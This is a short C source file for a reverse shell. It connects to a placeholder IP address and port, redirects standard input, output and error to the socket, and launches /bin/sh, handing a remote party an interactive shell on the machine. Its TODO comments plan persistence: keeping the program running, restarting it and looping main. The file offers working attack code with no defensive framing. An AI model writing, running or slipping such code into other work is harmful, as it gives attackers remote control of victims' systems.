#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/socket.h>
#include <string.h>
#include <arpa/inet.h>

char const IP[]   = "XXX.XXX.XXX.XXX";
char const PORT[] = "XXXXX";

// TODO: make the program never quiet 
// add a cleanup and restart function
// handle the SIGSEGV(Segmentation fault)
// add a loop to the main function


int main() {
    int sock;
    struct addrinfo hints, *res, *rp;

    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family     = AF_INET;
    hints.ai_socktype   = SOCK_STREAM;
    hints.ai_socktype   = 0;

    getaddrinfo(IP, PORT, &hints, &res); 
    for(rp = res; rp != NULL; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);

        if(sock == -1) continue;
        if(connect(sock, rp->ai_addr, rp->ai_addrlen) != -1) break;

        // shutdown(sock, 2);
    }

    if(rp == NULL) return -1;
    freeaddrinfo(res);

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *const bin_arg[] = {"/bin/sh", NULL};
    execve("/bin/sh", bin_arg, NULL);

   return 0; 
}
